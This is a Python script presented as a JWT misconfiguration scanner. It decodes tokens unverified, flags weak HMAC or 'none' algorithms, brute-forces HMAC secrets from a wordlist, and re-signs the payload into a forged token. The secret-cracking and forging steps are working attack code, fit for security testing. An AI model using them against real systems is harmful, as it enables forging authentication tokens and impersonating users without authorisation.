#!/usr/bin/env python3
import jwt
import json
import argparse
import base64
import time
from jwt import InvalidSignatureError, DecodeError

# ===============================
#  WORDLIST LOADING
# ===============================
def load_wordlist(path):
    try:
        with open(path, "r") as f:
            words = [w.strip() for w in f.readlines() if w.strip()]
        print(f"[+] Loaded {len(words)} secrets.")
        return words
    except:
        print("[-] Failed to load wordlist file.")
        return []

# ===============================
#  DECODE WITHOUT VERIFY
# ===============================
def decode_jwt_no_verify(token):
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except Exception as e:
        return {"error": str(e)}

# ===============================
#  CHECK HEADER
# ===============================
def check_header(token):
    header = token.split(".")[0]
    header_json = json.loads(base64.urlsafe_b64decode(header + "==").decode())
    alg = header_json.get("alg", "")
    issues = []

    if alg.lower().startswith("hs"):
        issues.append("hmac_algorithm")
    if alg.lower() == "none":
        issues.append("alg_none")

    return alg, issues

# ===============================
#  BRUTE FORCE SECRET
# ===============================
def brute_force(token, wordlist, alg):
    if not alg.lower().startswith("hs"):
        print("[!] Brute-force not applicable for RS256/ES256 tokens.")
        return None

    for secret in wordlist:
        try:
            jwt.decode(token, secret, algorithms=["HS256", "HS384", "HS512"])
            return secret
        except Exception:
            continue

    return None

# ===============================
#  RESIGN TOKEN
# ===============================
def resign(decoded, secret, alg):
    if secret is None:
        print("[!] Cannot re-sign: No secret found.")
        return None

    if not alg.upper().startswith("HS"):
        print("[!] Cannot re-sign: Non-HMAC algorithms require private keys.")
        return None

    try:
        return jwt.encode(decoded, secret, algorithm="HS256")
    except Exception as e:
        print(f"[!] Error re-signing: {e}")
        return None

# ===============================
#  GENERATE WEAK TOKEN
# ===============================
def generate_weak_token():
    payload = {
        "user": "admin",
        "role": "admin",
        "iat": int(time.time())
    }
    secret = "secret"

    token = jwt.encode(payload, secret, algorithm="HS256")

    print("\n==============================")
    print("   GENERATED WEAK TOKEN")
    print("==============================")
    print(f"Token:\n{token}")
    print(f"\nSecret: {secret}")
    print("==============================\n")

    return token, secret


# ===============================
#  MAIN
# ===============================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWT Misconfiguration Scanner")
    parser.add_argument("--token", help="JWT token to analyze")
    parser.add_argument("--wordlist", help="Wordlist of secrets")
    parser.add_argument("--generate-weak-token", action="store_true",
                        help="Generate a weak HS256 JWT for testing")

    args = parser.parse_args()

    # Mode: Generate weak token
    if args.generate_weak_token:
        generate_weak_token()
        exit()

    # Normal scan mode
    if not args.token or not args.wordlist:
        print("[-] Missing required arguments.\nUse --token and --wordlist OR use --generate-weak-token")
        exit()

    # Load wordlist
    wordlist = load_wordlist(args.wordlist)

    print("\n[+] Decoding JWT without verification ...")
    decoded = decode_jwt_no_verify(args.token)
    print(json.dumps(decoded, indent=4))

    print("\n[+] Checking header for misconfigurations ...")
    alg, issues = check_header(args.token)
    print(f"Algorithm: {alg}")
    print(f"Issues: {issues}")

    print("\n[+] Trying brute force for weak secret ...")
    found = brute_force(args.token, wordlist, alg)
    print(f"Found secret: {found}")

    print("\n[+] Re-signing token (if applicable) ...")
    new_token = resign(decoded, found, alg)
    print(f"New forged token: {new_token}")

    # Save report
    report = {
        "token": args.token,
        "algorithm": alg,
        "issues": issues,
        "decoded_payload": decoded,
        "weak_secret": found,
        "new_token": new_token
    }

    with open("jwt_report.json", "w") as f:
        json.dump(report, f, indent=4)

    print("[+] Report saved to jwt_report.json")
